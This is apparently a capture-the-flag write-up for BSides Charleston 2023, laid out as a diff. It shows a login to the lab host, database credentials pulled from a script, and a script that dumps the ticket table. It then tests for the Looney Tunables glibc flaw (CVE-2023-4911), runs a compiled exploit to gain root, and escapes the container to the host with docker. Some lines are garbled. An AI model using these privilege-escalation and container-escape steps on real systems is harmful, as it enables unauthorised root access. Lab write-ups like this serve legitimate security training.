@@ -1,0 +1,126 @@
+Connect to the target using SSH:
+ssh kingpwn@198.199.121.28
+password: panda17
+
+Let's check MySQL access:
+mysql -u dbtickets
+-bash: /usr/bin/mysql: Permission denied
+
+It seems user kingpwn cannot directly access the MySQL database with the provided credentials.
+
+Next, we'll test if tickets.py is executable:
+python3 tickets.py
+Enter Ticket Title: test
+Enter Ticket Description: test
+Enter A Severity Flag: High or Low: high
+Ticket Created: test
+
+Great! The script executes successfully. With access to mysql.connector, we can potentially manipulate this script or craft a new one using the embedded database credentials.
+
+Below is the provided tickets.py:
+
+import mysql.connector
+
+def create_ticket(title, description):
+user = 'dbtickets'
+password = 'ayuaiJ5YJ3XNn8'
+
+connection = mysql.connector.connect(
+    host="localhost",
+    user=user,
+    password=password,
+    database="ticketDB"
+)
+
+cursor = connection.cursor()
+flag = input("Enter A Severity Flag: High or Low: ")
+
+ticket = (title, description, flag)
+query = "INSERT INTO tickets (title, description, flag) VALUES (%s, %s, %s)"
+
+cursor.execute(query, ticket)
+connection.commit()
+
+print(f"Ticket Created: {title}")
+cursor.close()
+connection.close()
+
+if name == "main":
+title = input("Enter Ticket Title: ")
+description = input("Enter Ticket Description: ")
+create_ticket(title, description)
+
+
+To exploit the system, let's modify the script to fetch tickets:
+
+import mysql.connector
+
+def fetch_tickets_by_flag(flag):
+user = 'dbtickets'
+password = 'ayuaiJ5YJ3XNn8'
+
+connection = mysql.connector.connect(
+    host="localhost",
+    user=user,
+    password=password,
+    database="ticketDB"
+)
+
+cursor = connection.cursor()
+
+if flag == "all":
+    query = "SELECT * FROM tickets"
+    cursor.execute(query)
+else:
+    query = "SELECT * FROM tickets WHERE flag = %s"
+    cursor.execute(query, (flag,))
+
+tickets = cursor.fetchall()
+
+print("\nTickets in the Database:")
+for ticket in tickets:
+    print(", ".join(map(str, ticket)))
+
+cursor.close()
+connection.close()
+
+if name == "main":
+flag = input("Enter flag to filter by (or 'all' for all tickets): ").strip().lower()
+fetch_tickets_by_flag(flag)
+
+
+Upon execution, we retrieve FLAG_1:
+
+
+Though one might be tempted to continue querying this database for further insights, it proves fruitless.
+
+Shifting our focus to the docker access kingpwn possesses:
+docker ps
+
+This shows a running container. Attempting to connect:
+docker exec -it 703f5dd272c6 /bin/bash
+
+This approach doesn't yield significant results. We see the container is privileged but lack required permissions.
+
+A subsequent linpeas scan reveals the host version: ubuntu~20.04.1. With a looney username and a potentially vulnerable Ubuntu version, the files in the looney directory could be our exploit gateway.
+
+Based on the "Looney Tunables" exploit, we can test vulnerability:
+env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su
+
+Receiving a Segmentation fault (core dumped) indicates vulnerability, as per the repository: https://github.com/hadrian3689/looney-tunables-CVE-2023-4911.
+
+python3 libc.py
+
+Running the libc.py script produces a ", overriding libc binaries. To exploit, compile:
+gcc exp.c -o exploit
+./exploit
+
+Post-exploitation, we achieve root inside the container. The root directory contains FLAG2:
+FLAG2{NotDoneYet_EscapeToTheHostForTrueFreedom}
+
+The flag suggests a container escape. Utilizing a payload found on: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation
+docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
+
+Success! We're root on the host machine, with Flag_3 in sight:
+
+Victory at BSides Charleston 2023!
